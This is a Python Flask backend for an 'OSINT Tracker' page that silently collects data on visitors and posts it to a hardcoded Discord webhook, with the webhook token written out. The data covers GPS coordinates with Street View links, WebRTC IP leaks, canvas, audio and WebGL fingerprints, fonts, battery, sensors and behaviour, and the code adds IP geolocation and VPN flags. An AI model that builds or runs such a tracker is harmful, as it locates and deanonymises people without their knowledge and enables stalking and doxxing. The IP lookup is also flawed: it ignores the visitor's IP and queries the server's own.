from flask import Flask, request, jsonify, send_file
import json
import datetime
import os
import requests
import re
from pathlib import Path
import ipaddress

app = Flask(__name__)

# Your Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536152829444493322/2l-TyMVUKD8Ly2wk-0amSwuTwUeXY_yOltEQT1MMH8OT-d8vzN8UsbAQ7aJK2iSzgy7o"

# IP Intelligence APIs (free tier)
IP_APIS = {
    "ipinfo": "https://ipinfo.io/json",
    "ipapi": "https://ipapi.co/json/",
    "ip-api": "http://ip-api.com/json/",
    "geoplugin": "http://www.geoplugin.net/json.gp",
}

def get_ip_intelligence(ip=None):
    """Fetch comprehensive IP intelligence from multiple sources"""
    intelligence = {}
    
    # Try multiple APIs for redundancy
    for name, url in IP_APIS.items():
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                intelligence[name] = data
        except:
            continue
    
    # Parse and consolidate intelligence
    consolidated = {}
    
    # Extract IP
    for source in intelligence.values():
        if 'ip' in source:
            consolidated['ip'] = source['ip']
            break
    
    # Extract ISP/Organization
    for source in intelligence.values():
        if 'org' in source:
            consolidated['isp'] = source['org']
            break
        elif 'isp' in source:
            consolidated['isp'] = source['isp']
            break
    
    # Extract ASN
    for source in intelligence.values():
        if 'asn' in source:
            consolidated['asn'] = source['asn']
            break
        elif 'as' in source:
            consolidated['asn'] = source['as']
            break
    
    # Extract Location
    for source in intelligence.values():
        if 'city' in source:
            consolidated['city'] = source['city']
        if 'region' in source:
            consolidated['region'] = source['region']
        if 'country' in source:
            consolidated['country'] = source['country']
        if 'country_code' in source:
            consolidated['country_code'] = source['country_code']
        if 'zip' in source:
            consolidated['zip'] = source['zip']
        if 'timezone' in source:
            consolidated['timezone'] = source['timezone']
        if 'loc' in source:
            loc = source['loc'].split(',')
            if len(loc) == 2:
                consolidated['latitude'] = loc[0]
                consolidated['longitude'] = loc[1]
    
    # VPN/Proxy Detection
    consolidated['vpn'] = False
    consolidated['proxy'] = False
    consolidated['hosting'] = False
    consolidated['mobile'] = False
    
    for source in intelligence.values():
        if 'proxy' in source and source['proxy']:
            consolidated['proxy'] = True
        if 'hosting' in source and source['hosting']:
            consolidated['hosting'] = True
        if 'vpn' in source and source['vpn']:
            consolidated['vpn'] = True
        if 'mobile' in source and source['mobile']:
            consolidated['mobile'] = True
        
        # Check for keywords that indicate hosting/VPN
        if 'org' in source:
            org_lower = source['org'].lower()
            if any(word in org_lower for word in ['hosting', 'cloud', 'vpn', 'proxy', 'datacenter']):
                consolidated['hosting'] = True
            if any(word in org_lower for word in ['vpn', 'proxy']):
                consolidated['vpn'] = True
    
    # Security Intelligence (if available)
    consolidated['threat'] = {}
    if 'ipinfo' in intelligence and 'privacy' in intelligence['ipinfo']:
        privacy = intelligence['ipinfo']['privacy']
        consolidated['threat']['vpn'] = privacy.get('vpn', False)
        consolidated['threat']['proxy'] = privacy.get('proxy', False)
        consolidated['threat']['hosting'] = privacy.get('hosting', False)
        consolidated['threat']['tor'] = privacy.get('tor', False)
    
    return consolidated

def send_to_discord(data):
    """Send comprehensive data to Discord webhook"""
    
    embed = {
        "title": "🎯 OSINT Intel Package",
        "color": 0x5865F2,
        "fields": [],
        "footer": {"text": f"Session: {data.get('sessionId', 'unknown')} | {datetime.datetime.utcnow().isoformat()}"}
    }
    
    # --- LOCATION SECTION ---
    location = data.get('location', {})
    ip_intel = data.get('ipIntel', {})
    
    # GPS Location
    if location and isinstance(location, dict):
        lat = location.get('latitude')
        lng = location.get('longitude')
        if lat and lat != 'N/A' and lng and lng != 'N/A':
            accuracy = location.get('accuracy', 'N/A')
            maps_link = f"https://maps.google.com/?q={lat},{lng}"
            street_view = f"https://maps.google.com/maps?q={lat},{lng}&z=19&t=k&layer=c"
            
            embed["fields"].append({
                "name": "📍 GPS Location",
                "value": f"**Coordinates:** {lat}, {lng}\n**Accuracy:** ±{accuracy}m\n[Google Maps]({maps_link}) | [Street View]({street_view})",
                "inline": False
            })
    
    # IP-based Location
    ip_loc = []
    if ip_intel.get('city'):
        ip_loc.append(f"**City:** {ip_intel.get('city')}")
    if ip_intel.get('region'):
        ip_loc.append(f"**Region:** {ip_intel.get('region')}")
    if ip_intel.get('country'):
        ip_loc.append(f"**Country:** {ip_intel.get('country')}")
    if ip_intel.get('zip'):
        ip_loc.append(f"**ZIP:** {ip_intel.get('zip')}")
    if ip_intel.get('timezone'):
        ip_loc.append(f"**Timezone:** {ip_intel.get('timezone')}")
    
    if ip_loc:
        embed["fields"].append({
            "name": "🌐 IP Location",
            "value": "\n".join(ip_loc),
            "inline": False
        })
    
    # --- IP INTELLIGENCE ---
    ip_intel_fields = []
    if ip_intel.get('ip'):
        ip_intel_fields.append(f"**IP:** `{ip_intel.get('ip')}`")
    if ip_intel.get('isp'):
        ip_intel_fields.append(f"**ISP:** {ip_intel.get('isp')}")
    if ip_intel.get('asn'):
        ip_intel_fields.append(f"**ASN:** {ip_intel.get('asn')}")
    
    # Threat detection
    threat = []
    if ip_intel.get('vpn'): threat.append("🚫 VPN")
    if ip_intel.get('proxy'): threat.append("🚫 Proxy")
    if ip_intel.get('hosting'): threat.append("☁️ Hosting/Cloud")
    if ip_intel.get('mobile'): threat.append("📱 Mobile Network")
    
    if threat:
        ip_intel_fields.append(f"**Threat Flags:** {' '.join(threat)}")
    
    if ip_intel_fields:
        embed["fields"].append({
            "name": "🕵️ IP Intelligence",
            "value": "\n".join(ip_intel_fields),
            "inline": False
        })
    
    # --- WEBRTC LEAK ---
    webrtc = data.get('webRTCIPs', [])
    if webrtc and webrtc[0] != 'No local IPs found':
        embed["fields"].append({
            "name": "🔓 WebRTC IP Leak",
            "value": f"```{', '.join(webrtc)}```",
            "inline": False
        })
    
    # --- DEVICE FINGERPRINT ---
    device_fields = []
    
    # OS/Platform
    user_agent = data.get('userAgent', '')
    if user_agent:
        # Parse OS from user agent
        os_parsed = "Unknown"
        if 'Windows' in user_agent:
            os_parsed = "Windows"
            if 'NT 10.0' in user_agent: os_parsed += " 10/11"
            elif 'NT 6.1' in user_agent: os_parsed += " 7"
            elif 'NT 6.2' in user_agent: os_parsed += " 8"
            elif 'NT 6.3' in user_agent: os_parsed += " 8.1"
        elif 'Mac OS X' in user_agent:
            os_parsed = "macOS"
        elif 'Linux' in user_agent and 'Android' not in user_agent:
            os_parsed = "Linux"
        elif 'Android' in user_agent:
            os_parsed = "Android"
        elif 'iPhone' in user_agent or 'iPad' in user_agent:
            os_parsed = "iOS"
        
        # Parse browser
        browser_parsed = "Unknown"
        if 'Chrome' in user_agent and 'Edg' not in user_agent:
            browser_parsed = "Chrome"
        elif 'Firefox' in user_agent:
            browser_parsed = "Firefox"
        elif 'Safari' in user_agent and 'Chrome' not in user_agent:
            browser_parsed = "Safari"
        elif 'Edg' in user_agent:
            browser_parsed = "Edge"
        elif 'OPR' in user_agent or 'Opera' in user_agent:
            browser_parsed = "Opera"
        
        device_fields.append(f"**OS:** {os_parsed}")
        device_fields.append(f"**Browser:** {browser_parsed}")
    
    # Hardware
    if data.get('hardwareConcurrency'):
        device_fields.append(f"**CPU Cores:** {data['hardwareConcurrency']}")
    if data.get('deviceMemory'):
        device_fields.append(f"**RAM:** {data['deviceMemory']}GB")
    if data.get('touchPoints'):
        device_fields.append(f"**Touch Points:** {data['touchPoints']}")
    if data.get('platform'):
        device_fields.append(f"**Platform:** {data['platform']}")
    
    # Screen
    screen = data.get('screen', {})
    if screen:
        screen_info = f"{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}"
        if screen.get('pixelRatio'):
            screen_info += f" @{screen.get('pixelRatio')}x"
        device_fields.append(f"**Screen:** {screen_info}")
    
    if device_fields:
        embed["fields"].append({
            "name": "💻 Device Info",
            "value": "\n".join(device_fields),
            "inline": False
        })
    
    # --- GPU & GRAPHICS ---
    webgl = data.get('webgl', {})
    if webgl:
        gpu_fields = []
        if webgl.get('vendor'):
            gpu_fields.append(f"**GPU:** {webgl.get('vendor')}")
        if webgl.get('renderer'):
            gpu_fields.append(f"**Renderer:** {webgl.get('renderer')}")
        if gpu_fields:
            embed["fields"].append({
                "name": "🎮 Graphics",
                "value": "\n".join(gpu_fields),
                "inline": False
            })
    
    # --- FINGERPRINTS ---
    fingerprint_fields = []
    if data.get('canvasFingerprint'):
        fingerprint_fields.append(f"**Canvas:** `{data['canvasFingerprint']}`")
    if data.get('audioFingerprint'):
        fingerprint_fields.append(f"**Audio:** `{data['audioFingerprint']}`")
    if data.get('webglFingerprint'):
        fingerprint_fields.append(f"**WebGL:** `{data['webglFingerprint']}`")
    
    if fingerprint_fields:
        embed["fields"].append({
            "name": "🆔 Fingerprints",
            "value": "\n".join(fingerprint_fields),
            "inline": False
        })
    
    # --- FONTS ---
    fonts = data.get('fonts', [])
    if fonts:
        embed["fields"].append({
            "name": "📝 Installed Fonts",
            "value": f"```{', '.join(fonts[:15])}```" + (f"\n*+{len(fonts)-15} more*" if len(fonts) > 15 else ""),
            "inline": False
        })
    
    # --- PLUGINS ---
    plugins = data.get('plugins', [])
    if plugins:
        embed["fields"].append({
            "name": "🧩 Browser Plugins",
            "value": f"```{', '.join(plugins[:10])}```" + (f"\n*+{len(plugins)-10} more*" if len(plugins) > 10 else ""),
            "inline": False
        })
    
    # --- BATTERY ---
    battery = data.get('battery', {})
    if battery:
        battery_fields = []
        if battery.get('level'):
            battery_fields.append(f"**Level:** {battery['level']}")
        if battery.get('charging') is not None:
            battery_fields.append(f"**Charging:** {battery['charging']}")
        if battery.get('chargingTime'):
            battery_fields.append(f"**Charging Time:** {battery['chargingTime']}s")
        if battery.get('dischargingTime'):
            battery_fields.append(f"**Discharging Time:** {battery['dischargingTime']}s")
        
        if battery_fields:
            embed["fields"].append({
                "name": "🔋 Battery",
                "value": "\n".join(battery_fields),
                "inline": False
            })
    
    # --- SENSORS ---
    sensors = data.get('sensors', {})
    if sensors:
        sensor_fields = []
        if sensors.get('motion'):
            motion = sensors['motion']
            sensor_fields.append(f"**Motion:** α={motion.get('alpha', 'N/A'):.2f}° β={motion.get('beta', 'N/A'):.2f}° γ={motion.get('gamma', 'N/A'):.2f}°")
        if sensors.get('orientation'):
            orient = sensors['orientation']
            sensor_fields.append(f"**Orientation:** {orient.get('absolute', 'N/A')}")
        if sensor_fields:
            embed["fields"].append({
                "name": "📱 Sensors",
                "value": "\n".join(sensor_fields),
                "inline": False
            })
    
    # --- NETWORK ---
    network = data.get('network', {})
    if network:
        net_fields = []
        if network.get('type'):
            net_fields.append(f"**Type:** {network['type']}")
        if network.get('downlink'):
            net_fields.append(f"**Downlink:** {network['downlink']} Mbps")
        if network.get('rtt'):
            net_fields.append(f"**RTT:** {network['rtt']}ms")
        if network.get('saveData'):
            net_fields.append(f"**Save Data:** {network['saveData']}")
        
        if net_fields:
            embed["fields"].append({
                "name": "📶 Network",
                "value": "\n".join(net_fields),
                "inline": False
            })
    
    # --- PERFORMANCE ---
    perf = data.get('performance', {})
    if perf:
        perf_fields = []
        if perf.get('loadTime'):
            perf_fields.append(f"**Load Time:** {perf['loadTime']}ms")
        if perf.get('domReady'):
            perf_fields.append(f"**DOM Ready:** {perf['domReady']}ms")
        if perf.get('dns'):
            perf_fields.append(f"**DNS:** {perf['dns']}ms")
        if perf.get('tcp'):
            perf_fields.append(f"**TCP:** {perf['tcp']}ms")
        if perf.get('ttfb'):
            perf_fields.append(f"**TTFB:** {perf['ttfb']}ms")
        
        if perf_fields:
            embed["fields"].append({
                "name": "⚡ Performance",
                "value": "\n".join(perf_fields),
                "inline": False
            })
    
    # --- BEHAVIORAL ---
    behavioral = []
    if data.get('referrer'):
        behavioral.append(f"**Referrer:** {data['referrer']}")
    if data.get('url'):
        behavioral.append(f"**URL:** {data['url']}")
    if data.get('tabVisibility') is not None:
        behavioral.append(f"**Tab Visibility Events:** {data['tabVisibility']}")
    if data.get('historyDepth'):
        behavioral.append(f"**History Depth:** {data['historyDepth']}")
    if data.get('timezone'):
        behavioral.append(f"**Timezone:** {data['timezone']}")
    if data.get('language'):
        behavioral.append(f"**Language:** {data['language']}")
    
    if behavioral:
        embed["fields"].append({
            "name": "🧠 Behavioral",
            "value": "\n".join(behavioral),
            "inline": False
        })
    
    # --- SECURITY ---
    security = []
    if data.get('doNotTrack') is not None:
        security.append(f"**Do Not Track:** {data['doNotTrack']}")
    if data.get('cookieEnabled') is not None:
        security.append(f"**Cookies Enabled:** {data['cookieEnabled']}")
    
    if security:
        embed["fields"].append({
            "name": "🔒 Security",
            "value": "\n".join(security),
            "inline": False
        })
    
    # Send to Discord
    payload = {
        "content": "📊 **New OSINT Package Collected!**",
        "embeds": [embed],
        "username": "OSINT Tracker"
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=payload)
        return response.status_code == 204
    except Exception as e:
        print(f"Discord send error: {e}")
        return False

# Serve the main page
@app.route('/')
def serve_index():
    return send_file('../static/index.html')

# Receive tracking data
@app.route('/track', methods=['POST'])
def track_data():
    data = request.json
    
    # Get IP intelligence
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ip_intel = get_ip_intelligence(client_ip)
    data['ipIntel'] = ip_intel
    
    # Log to console
    print(f"\n{'='*60}")
    print(f"OSINT DATA RECEIVED - {datetime.datetime.now()}")
    print(f"{'='*60}")
    print(json.dumps(data, indent=2))
    print(f"{'='*60}\n")
    
    # Send to Discord
    discord_sent = send_to_discord(data)
    print(f"Discord webhook sent: {discord_sent}")
    
    return jsonify({
        "status": "success",
        "discord_sent": discord_sent
    })

# Health check
@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

app = app
